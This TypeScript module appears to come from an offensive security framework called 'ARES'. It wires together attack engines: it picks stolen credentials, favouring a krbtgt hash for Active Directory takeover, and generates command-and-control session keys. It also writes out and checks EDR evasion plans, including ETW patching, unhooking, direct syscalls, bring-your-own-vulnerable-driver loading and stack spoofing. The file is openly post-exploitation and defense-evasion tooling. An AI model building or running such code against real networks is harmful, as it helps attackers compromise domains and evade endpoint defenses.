/**
 * @module ares/_integrations
 * Bridges ARES engines to live modules elsewhere in packages/security/src.
 */
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as path from "node:path"
import { brokerExec, ensureAresDir, isToolAvailable, writeArtifact } from "./_base.ts"
import { CredentialGraph } from "../credential_graph.ts"
import { resolveAdChainContext, type AdChainContext } from "./_chain.ts"

export interface ExecStep {
  action: string
  success: boolean
  detail: string
  artifact?: string
}

export function step(action: string, success: boolean, detail: string, artifact?: string): ExecStep {
  return { action, success, detail: detail.slice(0, 1200), artifact }
}

export async function runCmd(label: string, cmd: string): Promise<ExecStep> {
  const r = await brokerExec(cmd)
  return step(label, r.ok || r.out.length > 10, r.out.slice(0, 800))
}

export async function runIfTool(tool: string, label: string, cmd: string): Promise<ExecStep> {
  if (!isToolAvailable(tool)) return step(label, false, `${tool} not on PATH`)
  return runCmd(label, cmd)
}

export function loadBestCredential(host?: string): { username: string; secret: string; domain?: string } | null {
  const cg = CredentialGraph.load()
  const krbtgt = cg.findKrbtgtHash()
  if (krbtgt) {
    const ctx = cg.getDomainContext()
    return { username: "krbtgt", secret: krbtgt, domain: ctx.domain }
  }
  const creds = host ? cg.unusedForHost(host) : cg.listCredentials().filter((c) => !c.used)
  const c = creds.find((x) => x.type === "password" || x.type === "nthash") ?? creds[0]
  if (!c) {
    if (process.env.OURMINE_AD_USER && process.env.OURMINE_AD_PASS) {
      return {
        username: process.env.OURMINE_AD_USER,
        secret: process.env.OURMINE_AD_PASS,
        domain: process.env.OURMINE_AD_DOMAIN,
      }
    }
    return null
  }
  return { username: c.username ?? "administrator", secret: c.value, domain: c.domain }
}

export function loadAdContext(opts: { domain?: string; target?: string } = {}): AdChainContext {
  return resolveAdChainContext(CredentialGraph.load(), opts)
}

export function c2Material(): { mailboxUrl: string; keyHex: string; session: string } {
  const keyHex = crypto.randomBytes(32).toString("hex")
  const session = `ares_${Date.now()}`
  const mailboxUrl = process.env.OURMINE_C2_MAILBOX ?? "http://127.0.0.1:8787/mailbox"
  return { mailboxUrl, keyHex, session }
}

export function writeJsonArtifact(sub: string, name: string, data: unknown): string {
  return writeArtifact(sub, name, JSON.stringify(data, null, 2))
}

export function parseAflCrashes(outDir: string): string[] {
  const crashes: string[] = []
  const crashDir = path.join(outDir, "crashes")
  if (!fs.existsSync(crashDir)) return crashes
  for (const f of fs.readdirSync(crashDir)) {
    if (f.startsWith("id:")) crashes.push(path.join(crashDir, f))
  }
  return crashes
}

export async function execEvasionPlans(edr: import("../edr_evasion.ts").EDREvasionEngine, sub: string): Promise<ExecStep[]> {
  const steps: ExecStep[] = []
  const plans = [
    ["direct_syscalls", edr.directSyscalls("halos_gate")],
    ["unhook_modules", edr.unhookModules()],
    ["patch_etw", edr.patchEtw()],
    ["remove_callbacks", edr.removeCallbacks()],
    ["byovd_load", edr.byovdLoad()],
    ["stack_spoof", edr.stackSpoof()],
    ["protect_process", edr.protectProcess()],
  ] as const
  for (const [name, plan] of plans) {
    const fp = writeJsonArtifact(sub, `${name}.json`, plan)
    steps.push(step(name, true, "plan materialized", fp))
    const code = (plan as Record<string, unknown>).code
      ?? ((plan as Record<string, unknown>).methods as Record<string, { code?: string }> | undefined)?.etw_event_write_patch?.code
    if (typeof code === "string" && code.includes("python")) {
      const py = writeArtifact(sub, `${name}.py`, code.replace(/\\n/g, "\n").replace(/\\x/g, "\\x"))
      const r = await runIfTool("python3", `${name}_syntax`, `python3 -m py_compile ${py} 2>&1`)
      steps.push({ ...r, action: `${name}_validate` })
    }
  }
  return steps
}
